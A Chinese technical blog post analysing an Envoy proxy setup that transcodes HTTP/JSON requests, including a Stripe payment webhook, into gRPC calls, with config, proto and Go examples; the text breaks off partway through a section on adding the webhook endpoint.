itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Envoy方案实现分析报告
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2268999473182269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鲁肃ls
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:55:31.000Z" title="Thu Dec 04 2025 08:55:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读31分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、架构概述</h2>
<h3 data-id="heading-1">1.1 系统架构</h3>
<pre><code class="hljs language-scss" lang="scss">HTTP Client (Webhook / API Client)
    ↓
Envoy Proxy (Port: <span class="hljs-number">2020</span>)
    ├─ HTTP Connection Manager
    │   └─ HTTP Filters Chain
    │       ├─ Lua <span class="hljs-attribute">Filter</span> (响应转换，可选)
    │       ├─ gRPC-JSON Transcoding <span class="hljs-attribute">Filter</span>
    │       └─ Router <span class="hljs-attribute">Filter</span>
    │           └─ Route Configuration
    │               ├─ /api/v1/payment/channels → payment_gateway_grpc
    │               ├─ /api/v2/payment/webhook/stripe/{account_id} → payment_stripe_grpc
    │               └─ /healthz → payment_stripe_grpc
    ↓
gRPC Services
    ├─ payment_stripe_grpc (<span class="hljs-number">172.29</span>.<span class="hljs-number">119.29</span>:<span class="hljs-number">8080</span>)
    └─ payment_gateway_grpc (<span class="hljs-number">172.29</span>.<span class="hljs-number">119.29</span>:<span class="hljs-number">8090</span>)
</code></pre>
<h3 data-id="heading-2">1.2 核心功能</h3>
<ol>
<li><strong>gRPC 到 HTTP 的协议转换</strong>：通过 gRPC-JSON Transcoding 将 HTTP/JSON 请求转换为 gRPC 调用</li>
<li><strong>响应格式统一</strong>：通过 Lua 过滤器（可选）将 gRPC 响应格式转换为统一的 API 响应格式</li>
<li><strong>多服务路由</strong>：支持多个 gRPC 服务的统一入口和路由分发</li>
<li><strong>协议桥接</strong>：实现 HTTP RESTful API 与 gRPC 服务之间的无缝桥接</li>
</ol>
<hr/>
<h2 data-id="heading-3">二、工作原理：Envoy 如何获取和传递外部请求</h2>
<h3 data-id="heading-4">2.1 外部请求到 Envoy 的完整流程</h3>
<p><strong>外部业务请求示例</strong>（以 Stripe Webhook 为例）：</p>
<pre><code class="hljs language-bash" lang="bash">POST /api/v2/payment/webhook/stripe/acct_123456 HTTP/1.1
Host: api.example.com
Content-Type: application/json
Stripe-Signature: t=1234567890,v1=signature_value_here

{
  <span class="hljs-string">"id"</span>: <span class="hljs-string">"evt_123"</span>,
  <span class="hljs-string">"type"</span>: <span class="hljs-string">"payment.succeeded"</span>,
  <span class="hljs-string">"data"</span>: {...}
}
</code></pre>
<h3 data-id="heading-5">2.2 Envoy 接收和提取过程</h3>
<h4 data-id="heading-6">2.2.1 步骤 1：Envoy 接收 HTTP 请求</h4>
<p><strong>Envoy Listener 接收请求</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">listeners:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">listener_0</span>
    <span class="hljs-attr">address:</span>
      <span class="hljs-attr">socket_address:</span>
        <span class="hljs-attr">address:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
        <span class="hljs-attr">port_value:</span> <span class="hljs-number">2020</span>  <span class="hljs-comment"># Envoy 监听端口</span>
</code></pre>
<ul>
<li>外部请求到达 Envoy 的 2020 端口</li>
<li>Envoy HTTP Connection Manager 接收完整的 HTTP 请求</li>
<li>包含：HTTP Method、Path、Headers、Body</li>
</ul>
<h4 data-id="heading-7">2.2.2 步骤 2：Router Filter 匹配路由</h4>
<p><strong>路由匹配</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">routes:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">match:</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">"/api/v2/payment/webhook/stripe/{account_id}"</span>
      <span class="hljs-attr">headers:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">":method"</span>
          <span class="hljs-attr">exact_match:</span> <span class="hljs-string">"POST"</span>
    <span class="hljs-attr">route:</span>
      <span class="hljs-attr">cluster:</span> <span class="hljs-string">payment_stripe_grpc</span>
</code></pre>
<ul>
<li>Router Filter 解析 HTTP Path：<code>/api/v2/payment/webhook/stripe/acct_123456</code></li>
<li>匹配路由规则，确定目标集群：<code>payment_stripe_grpc</code></li>
<li><strong>此时 Path 和 Headers 都在 Envoy 内部，还未提取</strong></li>
</ul>
<h4 data-id="heading-8">2.2.3 步骤 3：gRPC-JSON Transcoding 提取和转换</h4>
<p><strong>gRPC-JSON Transcoding Filter 的工作</strong>：</p>
<ol start="5">
<li>
<p><strong>读取 Proto Descriptor</strong>：</p>
<ol>
<li>加载 <code>payment_combined.pb</code> 文件</li>
<li>查找匹配的 HTTP 注解：<code>post: "/api/v2/payment/webhook/stripe/{account_id}"</code></li>
</ol>
</li>
<li>
<p><strong>提取 Path 参数</strong>：</p>
<ol>
<li>
<pre><code class="hljs language-bash" lang="bash">HTTP Path: /api/v2/payment/webhook/stripe/acct_123456
Proto 模式: /api/v2/payment/webhook/stripe/{account_id}
↓
提取: account_id = <span class="hljs-string">"acct_123456"</span>
</code></pre>
</li>
</ol>
</li>
<li>
<p><strong>提取请求体（Body）</strong> ：</p>
<ol>
<li>
<pre><code class="hljs language-css" lang="css">HTTP <span class="hljs-selector-tag">Body</span>: {"id": <span class="hljs-string">"evt_123"</span>, <span class="hljs-string">"type"</span>: <span class="hljs-string">"payment.succeeded"</span>, ...}
↓
根据 <span class="hljs-selector-tag">body</span>: <span class="hljs-string">"*"</span> 规则，将整个 JSON 映射到 gRPC 消息
如果 proto 定义中有 payload 字段，会尝试映射
</code></pre>
</li>
</ol>
</li>
<li>
<p><strong>处理 Header</strong>：</p>
<ol>
<li><strong>重要</strong>：gRPC-JSON Transcoding <strong>默认不会将 HTTP Header 映射到 gRPC 消息字段</strong></li>
<li>但 Envoy 会自动将 HTTP Header 转换为 gRPC Metadata（这是 Envoy 的默认行为）</li>
</ol>
</li>
</ol>
<h3 data-id="heading-9">2.3 Header 传递机制详解</h3>
<h4 data-id="heading-10">2.3.1 Envoy 自动将 HTTP Header 转换为 gRPC Metadata</h4>
<p><strong>Envoy 的默认行为</strong>：</p>
<ul>
<li>所有 HTTP Header 都会自动转换为 gRPC Metadata</li>
<li>Header 名称转换为小写，连字符保留</li>
<li>例如：<code>Stripe-Signature</code> → gRPC Metadata key: <code>stripe-signature</code></li>
</ul>
<p><strong>转换规则</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">HTTP Header: Stripe-Signature:</span> <span class="hljs-string">t=1234567890,v1=signature_value</span>
    <span class="hljs-string">↓</span>
<span class="hljs-attr">gRPC Metadata:</span> 
  <span class="hljs-attr">Key:</span> <span class="hljs-string">"stripe-signature"</span>
  <span class="hljs-attr">Value:</span> [<span class="hljs-string">"t=1234567890,v1=signature_value"</span>]
</code></pre>
<h4 data-id="heading-11">2.3.2 在 gRPC 服务中获取 Header（通过 Metadata）</h4>
<p><strong>gRPC 服务代码示例</strong>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *PaymentStripeService)</span></span> HandleWebhook(ctx context.Context, req *pb.HandleWebhookReq) (*pb.HandleWebhookResp, <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 1. 从 gRPC Metadata 中获取 HTTP Header</span>
    md, ok := metadata.FromIncomingContext(ctx)
    <span class="hljs-keyword">if</span> !ok {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">"无法获取 metadata"</span>)
    }
    
    <span class="hljs-comment">// 2. 获取 Stripe-Signature header（已转换为小写）</span>
    signatureValues := md.Get(<span class="hljs-string">"stripe-signature"</span>)
    signature := <span class="hljs-string">""</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(signatureValues) &gt; <span class="hljs-number">0</span> {
        signature = signatureValues[<span class="hljs-number">0</span>]  <span class="hljs-comment">// 获取第一个值</span>
    }
    
    <span class="hljs-comment">// 3. 从请求消息获取其他参数</span>
    payload := req.GetPayload()      <span class="hljs-comment">// 从 HTTP Body 获取</span>
    accountID := req.GetAccountId()  <span class="hljs-comment">// 从 Path 参数获取</span>
    
    <span class="hljs-comment">// 4. 现在可以验证签名了</span>
    <span class="hljs-keyword">if</span> err := s.verifySignature(payload, signature, accountID); err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> &amp;pb.HandleWebhookResp{
            Code: <span class="hljs-number">400</span>,
            Msg: <span class="hljs-string">"签名验证失败"</span>,
        }, <span class="hljs-literal">nil</span>
    }
    
    <span class="hljs-comment">// 5. 处理业务逻辑</span>
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-12">2.4 Path 参数传递机制详解</h3>
<h4 data-id="heading-13">2.4.1 Proto 定义中的路径参数</h4>
<pre><code class="hljs language-ini" lang="ini">rpc HandleWebhook(HandleWebhookReq) returns (HandleWebhookResp) {
  option (google.api.http) = {
    post: "/api/v2/payment/webhook/stripe/{account_id}"  // {account_id} 是路径参数占位符
    body: "*"
  }<span class="hljs-comment">;</span>
}

message HandleWebhookReq {
  bytes <span class="hljs-attr">payload</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  string <span class="hljs-attr">signature</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
  string <span class="hljs-attr">account_id</span> = <span class="hljs-number">3</span><span class="hljs-comment">;  // 路径参数会映射到这个字段</span>
}
</code></pre>
<h4 data-id="heading-14">2.4.2 gRPC-JSON Transcoding 的提取过程</h4>
<p><strong>详细步骤</strong>：</p>
<ol start="9">
<li>
<p><strong>解析 HTTP Path</strong>：</p>
<ol>
<li>
<pre><code class="hljs language-bash" lang="bash">外部请求: POST /api/v2/payment/webhook/stripe/acct_123456
</code></pre>
</li>
</ol>
</li>
<li>
<p><strong>匹配 Proto 注解</strong>：</p>
<ol>
<li>
<pre><code class="hljs language-arduino" lang="arduino">Proto 注解: post: <span class="hljs-string">"/api/v2/payment/webhook/stripe/{account_id}"</span>
匹配成功！
</code></pre>
</li>
</ol>
</li>
<li>
<p><strong>提取路径参数</strong>：</p>
<ol>
<li>
<pre><code class="hljs language-bash" lang="bash">路径模式: /api/v2/payment/webhook/stripe/{account_id}
实际路径: /api/v2/payment/webhook/stripe/acct_123456
↓
提取参数: account_id = <span class="hljs-string">"acct_123456"</span>
</code></pre>
</li>
</ol>
</li>
<li>
<p><strong>映射到 gRPC 消息字段</strong>：</p>
<ol>
<li>
<pre><code class="hljs language-perl" lang="perl">字段名匹配: <span class="hljs-string">{account_id}</span> → HandleWebhookReq.account_id
↓
构建 gRPC 消息:
HandleWebhookRe<span class="hljs-string">q {
  account_id: "acct_123456"  // ✅ 从路径提取
}</span>
</code></pre>
</li>
</ol>
</li>
</ol>
<h3 data-id="heading-15">2.5 完整数据流示例</h3>
<p><strong>外部请求</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">POST /api/v2/payment/webhook/stripe/acct_123456 HTTP/1.1
Host: api.example.com
Content-Type: application/json
Stripe-Signature: t=1234567890,v1=signature_value

{<span class="hljs-string">"id"</span>: <span class="hljs-string">"evt_123"</span>, <span class="hljs-string">"type"</span>: <span class="hljs-string">"payment.succeeded"</span>}
</code></pre>
<p><strong>Envoy 处理流程</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-number">1.</span> <span class="hljs-title class_">Envoy</span> <span class="hljs-title class_">Listener</span> 接收请求
   ├─ <span class="hljs-title class_">Method</span>: <span class="hljs-variable constant_">POST</span>
   ├─ <span class="hljs-title class_">Path</span>: <span class="hljs-regexp">/api/</span>v2/payment/webhook/stripe/acct_123456
   ├─ <span class="hljs-title class_">Headers</span>: 
   │   ├─ <span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span>: application/json
   │   └─ <span class="hljs-title class_">Stripe</span>-<span class="hljs-title class_">Signature</span>: t=<span class="hljs-number">1234567890</span>,v1=signature_value
   └─ <span class="hljs-title class_">Body</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-string">"evt_123"</span>, <span class="hljs-string">"type"</span>: <span class="hljs-string">"payment.succeeded"</span>}

<span class="hljs-number">2.</span> <span class="hljs-title class_">Router</span> <span class="hljs-title class_">Filter</span> 匹配路由
   └─ 匹配到: <span class="hljs-regexp">/api/</span>v2/payment/webhook/stripe/{account_id}
   └─ 目标集群: payment_stripe_grpc

<span class="hljs-number">3.</span> gRPC-<span class="hljs-title class_">JSON</span> <span class="hljs-title class_">Transcoding</span> <span class="hljs-title class_">Filter</span> 转换
   ├─ 读取 proto descriptor
   ├─ 匹配 <span class="hljs-variable constant_">HTTP</span> 注解: <span class="hljs-attr">post</span>: <span class="hljs-string">"/api/v2/payment/webhook/stripe/{account_id}"</span>
   ├─ 提取路径参数: account_id = <span class="hljs-string">"acct_123456"</span>
   ├─ 提取请求体: payload = {<span class="hljs-string">"id"</span>: <span class="hljs-string">"evt_123"</span>, ...} (转换为 bytes)
   └─ 构建 gRPC 消息:
       <span class="hljs-title class_">HandleWebhookReq</span> {
         <span class="hljs-attr">payload</span>: [bytes <span class="hljs-keyword">from</span> body]
         <span class="hljs-attr">account_id</span>: <span class="hljs-string">"acct_123456"</span>  <span class="hljs-comment">// 从路径提取</span>
       }

<span class="hljs-number">4.</span> <span class="hljs-title class_">Envoy</span> 自动转换 <span class="hljs-variable constant_">HTTP</span> <span class="hljs-title class_">Header</span> → gRPC <span class="hljs-title class_">Metadata</span>
   └─ <span class="hljs-title class_">Stripe</span>-<span class="hljs-title class_">Signature</span> → <span class="hljs-title class_">Metadata</span>[<span class="hljs-string">"stripe-signature"</span>] = <span class="hljs-string">"t=1234567890,v1=signature_value"</span>

<span class="hljs-number">5.</span> 发起 gRPC 调用
   └─ <span class="hljs-title class_">PaymentStripe</span>/<span class="hljs-title class_">HandleWebhook</span>(<span class="hljs-title class_">HandleWebhookReq</span>)
   └─ <span class="hljs-title class_">Metadata</span>: {<span class="hljs-string">"stripe-signature"</span>: [<span class="hljs-string">"t=1234567890,v1=signature_value"</span>]}

<span class="hljs-number">6.</span> gRPC 服务接收
   ├─ req.<span class="hljs-title class_">GetAccountId</span>() → <span class="hljs-string">"acct_123456"</span>  <span class="hljs-comment">// 从 gRPC 消息获取</span>
   ├─ req.<span class="hljs-title class_">GetPayload</span>() → [bytes]           <span class="hljs-comment">// 从 gRPC 消息获取</span>
   └─ metadata.<span class="hljs-title class_">Get</span>(<span class="hljs-string">"stripe-signature"</span>) → <span class="hljs-string">"t=1234567890,v1=signature_value"</span>  <span class="hljs-comment">// 从 Metadata 获取</span>
</code></pre>
<h3 data-id="heading-16">2.6 关键要点总结</h3>
<ol start="13">
<li>
<p><strong>Path 参数提取</strong>：</p>
<ol>
<li>✅ 通过 proto 注解中的 <code>{account_id}</code> 自动提取</li>
<li>✅ 自动映射到 gRPC 消息字段 <code>account_id</code></li>
<li>✅ 字段名必须匹配</li>
</ol>
</li>
<li>
<p><strong>Header 传递</strong>：</p>
<ol>
<li>✅ Envoy <strong>自动</strong>将 HTTP Header 转换为 gRPC Metadata</li>
<li>✅ 不需要额外配置</li>
<li>✅ 在 gRPC 服务中通过 <code>metadata.FromIncomingContext(ctx)</code> 获取</li>
<li>❌ <strong>不会</strong>自动映射到 gRPC 消息字段</li>
</ol>
</li>
<li>
<p><strong>请求体传递</strong>：</p>
<ol>
<li>✅ 通过 <code>body: "*"</code> 规则映射到 gRPC 消息字段</li>
<li>✅ JSON 字段名必须与 proto 字段名匹配</li>
</ol>
</li>
<li>
<p><strong>数据来源总结</strong>：</p>
<ol>
<li><strong>Path 参数</strong> → gRPC 消息字段（自动映射）</li>
<li><strong>HTTP Header</strong> → gRPC Metadata（自动转换）</li>
<li><strong>HTTP Body</strong> → gRPC 消息字段（根据 body 规则映射）</li>
</ol>
</li>
</ol>
<hr/>
<h2 data-id="heading-17">三、配置操作：如何添加和管理接口</h2>
<h3 data-id="heading-18">3.1 添加新的 API 接口（以 ListChannels 为例）</h3>
<p><strong>场景</strong>：在 <code>PaymentGateway</code> 服务中添加 <code>ListChannels</code> API 接口，将 gRPC 方法暴露为 HTTP GET 接口</p>
<p><strong>完整操作流程</strong>：</p>
<h4 data-id="heading-19">步骤 1：在 hh-idl 中修改 Proto 文件，添加 HTTP 注解</h4>
<p><strong>文件位置</strong>：<code>hh-idl/payment_gateway/v1/hh_payment_gateway.proto</code></p>
<p><strong>需要修改的地方</strong>：</p>
<ol start="17">
<li><strong>确保导入 HTTP 注解</strong>（文件开头）：</li>
</ol>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">syntax</span> = <span class="hljs-string">"proto3"</span><span class="hljs-comment">;</span>
package hh_payment_gateway.v1<span class="hljs-comment">;</span>
option <span class="hljs-attr">go_package</span> = <span class="hljs-string">"./v1"</span><span class="hljs-comment">;</span>

import "common/payment.proto"<span class="hljs-comment">;</span>
import "common/base.proto"<span class="hljs-comment">;</span>
import "google/api/annotations.proto"<span class="hljs-comment">;  // 必须导入这个</span>
</code></pre>
<ol start="18">
<li><strong>在服务方法上添加 HTTP 注解</strong>：</li>
</ol>
<pre><code class="hljs language-scss" lang="scss">service PaymentGateway {
  rpc <span class="hljs-built_in">ListChannels</span>(ListChannelsReq) returns (ListChannelsResp) {
    option (google.api.http) = {
      get: <span class="hljs-string">"/api/v1/payment/channels"</span>  // 定义 HTTP 路径和方法
    };
  };
  <span class="hljs-comment">// 其他方法...</span>
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li><code>option (google.api.http)</code> 是 gRPC-JSON Transcoding 的注解</li>
<li><code>get: "/api/v1/payment/channels"</code> 定义 HTTP GET 方法和路径</li>
<li>路径参数可以使用 <code>{param_name}</code> 语法，如 <code>/api/v2/payment/webhook/stripe/{account_id}</code></li>
<li>支持 <code>get</code>、<code>post</code>、<code>put</code>、<code>delete</code>、<code>patch</code> 等 HTTP 方法</li>
</ul>
<h4 data-id="heading-20">步骤 2：编译生成 payment_combined.pb 文件</h4>
<p><strong>执行编译脚本</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> /apps/www/go/src/hh_bmp/envoy
./build-proto.sh
</code></pre>
<p><strong>编译过程</strong>：</p>
<ol start="19">
<li>脚本会检查 <code>protoc</code> 是否安装</li>
<li>读取 <code>hh-idl/payment_gateway/v1/hh_payment_gateway.proto</code> 文件</li>
<li>使用 <code>--include_imports</code> 包含所有依赖（如 <code>common/payment.proto</code>、<code>common/base.proto</code>）</li>
<li>使用 <code>--include_source_info</code> 包含源信息（用于错误提示）</li>
<li>生成 <code>proto/payment_combined.pb</code> 文件（包含所有服务的 descriptor set）</li>
</ol>
<p><strong>生成的 pb 文件包含</strong>：</p>
<ul>
<li><code>ListChannels</code> 方法的定义</li>
<li>HTTP 注解信息（<code>get: "/api/v1/payment/channels"</code>）</li>
<li>所有依赖的 proto 文件定义</li>
<li>源信息（用于调试）</li>
</ul>
<p><strong>验证生成的文件</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">ls</span> -lh proto/payment_combined.pb
<span class="hljs-comment"># 应该能看到生成的 .pb 文件</span>
</code></pre>
<h4 data-id="heading-21">步骤 3：在 envoy.yaml 中配置路由（可选，但推荐）</h4>
<p><strong>文件位置</strong>：<code>envoy/envoy.yaml</code></p>
<p><strong>配置位置</strong>：<code>route_config.routes</code> 部分</p>
<p><strong>添加路由配置</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">route_config:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">local_route</span>
  <span class="hljs-attr">virtual_hosts:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">local_service</span>
      <span class="hljs-attr">domains:</span> [<span class="hljs-string">"*"</span>]
      <span class="hljs-attr">routes:</span>
        <span class="hljs-comment"># Payment Gateway - ListChannels 路由（放在前面，优先匹配）</span>
        <span class="hljs-comment"># proto 注解：get: "/api/v1/payment/channels"</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">match:</span>
            <span class="hljs-attr">path:</span> <span class="hljs-string">"/api/v1/payment/channels"</span>
          <span class="hljs-attr">route:</span>
            <span class="hljs-attr">cluster:</span> <span class="hljs-string">payment_gateway_grpc</span>
            <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>
        <span class="hljs-comment"># 其他路由...</span>
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li><code>path: "/api/v1/payment/channels"</code> 必须与 proto 中的 HTTP 注解路径一致</li>
<li><code>cluster: payment_gateway_grpc</code> 指向对应的 gRPC 服务集群</li>
<li><code>timeout: 5s</code> 设置请求超时时间</li>
<li>路由顺序很重要：精确匹配的路由应该放在前面，默认路由放在最后</li>
</ul>
<p><strong>为什么需要手动添加路由？</strong></p>
<ul>
<li>
<p>gRPC-JSON Transcoding 可以根据 proto 注解自动处理请求转换</p>
</li>
<li>
<p>但手动添加路由可以：</p>
<ul>
<li>设置自定义超时时间</li>
<li>添加重试策略</li>
<li>设置优先级</li>
<li>添加其他路由规则</li>
</ul>
</li>
</ul>
<h4 data-id="heading-22">步骤 4：确保 gRPC-JSON Transcoding 配置正确</h4>
<p><strong>检查 envoy.yaml 中的配置</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">http_filters:
  - name: envoy.filters.http.grpc_json_transcoder
    typed_config:
      <span class="hljs-string">"@type"</span>: type.googleapis.com/envoy.extensions.filters.http.grpc_json_transcoder.v3.GrpcJsonTranscoder
      proto_descriptor: <span class="hljs-string">"/etc/envoy/proto/payment_combined.pb"</span>  <span class="hljs-comment"># 使用编译生成的 pb 文件</span>
      services:
        - <span class="hljs-string">"hh_payment_stripe.v1.PaymentStripe"</span>
        - <span class="hljs-string">"hh_payment_gateway.v1.PaymentGateway"</span>  <span class="hljs-comment"># 确保包含这个服务</span>
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li><code>proto_descriptor</code> 指向编译生成的 <code>payment_combined.pb</code> 文件</li>
<li><code>services</code> 列表必须包含 <code>hh_payment_gateway.v1.PaymentGateway</code></li>
<li>如果添加了新服务，需要在这里添加服务名</li>
</ul>
<h4 data-id="heading-23">步骤 5：重启 Envoy 以加载新配置</h4>
<p><strong>重启后</strong>，Envoy 会：</p>
<ol start="24">
<li>加载新的 <code>payment_combined.pb</code> 文件</li>
<li>读取 <code>ListChannels</code> 的 HTTP 注解</li>
<li>建立 HTTP 路径 <code>/api/v1/payment/channels</code> 到 gRPC 方法 <code>ListChannels</code> 的映射</li>
</ol>
<p><strong>测试接口</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">curl http://localhost:2020/api/v1/payment/channels
</code></pre>
<p><strong>请求流程</strong>：</p>
<ol start="27">
<li>HTTP GET 请求 → <code>/api/v1/payment/channels</code></li>
<li>Envoy Router Filter → 匹配路由 → <code>payment_gateway_grpc</code> 集群</li>
<li>gRPC-JSON Transcoding → 根据 proto 注解转换为 gRPC 调用</li>
<li>gRPC 调用 → <code>hh_payment_gateway.v1.PaymentGateway/ListChannels</code></li>
<li>gRPC 响应 → gRPC-JSON Transcoding 转换为 JSON</li>
<li>Lua Filter（如果使用）→ 响应格式转换</li>
<li>HTTP 响应返回客户端</li>
</ol>
<h3 data-id="heading-24">3.2 添加 Webhook 接口（以 Stripe Webhook 为例）</h3>
<p><strong>场景</strong>：添加 Stripe Webhook 接口，接收 POST 请求</p>
<p><strong>操作步骤</strong>：</p>
<h4 data-id="heading-25">步骤 1：在 hh-idl 中修改 Proto 文件</h4>
<p><strong>文件位置</strong>：<code>hh-idl/payment_stripe/v1/hh_payment_stripe.proto</code></p>
<p><strong>添加 HTTP 注解</strong>：</p>
<pre><code class="hljs language-scss" lang="scss">service PaymentStripe {
  rpc <span class="hljs-built_in">HandleWebhook</span>(HandleWebhookReq) returns (HandleWebhookResp) {
